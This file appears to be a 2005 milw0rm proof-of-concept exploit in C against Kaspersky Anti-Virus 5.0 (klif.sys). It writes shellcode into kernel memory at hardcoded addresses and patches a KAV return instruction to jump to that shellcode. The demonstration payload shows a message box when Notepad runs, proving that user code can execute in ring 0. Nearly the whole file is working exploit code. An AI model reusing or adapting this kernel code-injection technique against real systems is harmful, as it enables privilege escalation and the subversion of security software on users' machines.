/* Added NO_STRICT to 1 on line 2 /str0ke ! milw0rm.com */
#define NO_STRICT 1
#include <windows.h>

#undef STRICT

PUCHAR pCodeBase=(PUCHAR)0xBE9372C0;

PDWORD pJmpAddress=(PDWORD)0xBE9372B0;

PUCHAR pKAVRets[]={(PUCHAR)0xBE935087,(PUCHAR)0xBE935046};

PUCHAR pKAVRet;


unsigned char code[]={0x68,0x00,0x02,0x00,0x00,	//push 0x200
					0x68,0x00,0x80,0x93,0xBE,	//push <buffer address> - 0xBE938000
					0x6A,0x00,					//push 0
					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<GetModuleFileNameA> -> +13
					0xFF,0xD0,					//call eax
					0x68,0x00,0x80,0x93,0xBE,	//push <buffer address>
					0x68,0x00,0x82,0x93,0xBE,	//push <address of the notepad path>- 0xBE938200
					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<lstrcmpiA> -> +30
					0xFF,0xD0,					//call eax
					0x85,0xC0,					//test eax,eax
					0x74,0x03,					//je +03
					0xC2,0x04,0x00,				//retn 4
					0x6A,0x00,					//push 0
					0x68,0x00,0x84,0x93,0xBE,	//push <address of the message string>- 0xBE938400
					0x68,0x00,0x84,0x93,0xBE,	//push <address of the message string>- 0xBE938400
					0x6A,0x00,					//push 0
					0xB8,0x00,0x00,0x00,0x00,	//mov eax,<MessageBoxA> -> +58
					0xFF,0xD0,					//call eax
					0xC2,0x04,0x00				//retn 4
					};

unsigned char jmp_code[]={0xFF,0x25,0xB0,0x72,0x93,0xBE}; //jmp dword prt [0xBE9372B0]

//////////////////////////////////////////////////////////////

BOOLEAN LoadExploitIntoKernelMemory(void){



//Get function's addresses

	HANDLE hKernel=GetModuleHandle("KERNEL32.DLL");
	HANDLE hUser=GetModuleHandle("USER32.DLL");

	FARPROC pGetModuleFileNameA=GetProcAddress(hKernel,"GetModuleFileNameA");
	FARPROC plstrcmpiA=GetProcAddress(hKernel,"lstrcmpiA");

	FARPROC pMessageBoxA=GetProcAddress(hUser,"MessageBoxA");

	*(DWORD*)(code+13)=(DWORD)pGetModuleFileNameA;
	*(DWORD*)(code+30)=(DWORD)plstrcmpiA;
	*(DWORD*)(code+58)=(DWORD)pMessageBoxA;

//Prepare our data into ring0-zone.

	PCHAR pNotepadName=(PCHAR)0xBE938200;

	char temp_buffer[MAX_PATH];
	char *s;

	SearchPath(NULL,"NOTEPAD",".EXE",sizeof(temp_buffer),temp_buffer,&s);

	lstrcpy(pNotepadName,temp_buffer);

	PCHAR pMessage=(PCHAR)0xBE938400;

	lstrcpy(pMessage,"Notepad is running!!! KAV is vulnerable!!!");

	memmove(pCodeBase,code,sizeof(code));

	*pJmpAddress=(DWORD)pCodeBase;

	memmove(pKAVRet,jmp_code,sizeof(jmp_code));

	return TRUE;
}

///////////////////////////////////////////////////////////////

void UnloadExploitFromKernelMemory(){

	UCHAR retn_4[]={0xC2,0x04,0x00};

	memmove(pKAVRet,retn_4,sizeof(retn_4));

}

/////////////////////////////////////////////////////////////////

PUCHAR GetKAVRetAddress(void){

//Check the retn 4 in the KAV 0xBE9334E1 function end
//Also, we check the KAV klif.sys existance.

	UCHAR retn_4[]={0xC2,0x04,0x00};

	__try{

		for(DWORD i=0;i<sizeof(pKAVRets)/sizeof(pKAVRets[0]);i++){

			if(memcmp(pKAVRets[i],retn_4,sizeof(retn_4))==0)
				return pKAVRets[i];

		}

	}__except(EXCEPTION_EXECUTE_HANDLER){MessageBox(NULL,"KAV is not installed",NULL,0);return NULL;}


	MessageBox(NULL,"Wrong KAV version. You need 5.0.227, 5.0.228 or 5.0.335 versions of KAV",NULL,0);
	return NULL;
}

/////////////////////////////////////////////////////////////////

void main(void){

	pKAVRet=GetKAVRetAddress();

	if(NULL==pKAVRet)
		return;


	if(!LoadExploitIntoKernelMemory())
		return;

	char temp_buffer[MAX_PATH];
	char *s;

	SearchPath(NULL,"NOTEPAD",".EXE",sizeof(temp_buffer),temp_buffer,&s);

	PROCESS_INFORMATION pi;

	STARTUPINFO si={0};
	si.cb=sizeof(si);

	CreateProcess(NULL,temp_buffer,NULL,NULL,FALSE,
						0,NULL,NULL,&si,&pi);

	WaitForSingleObject(pi.hProcess,INFINITE);

	MessageBox(NULL,"Now you may start your own Notepad instance to check this exploit!","KAV_EXPLOITER",0);

	MessageBox(NULL,"Close this window to stop exploitation","KAV_EXPLOITER",0);

	UnloadExploitFromKernelMemory();
}

// milw0rm.com [2005-06-07]
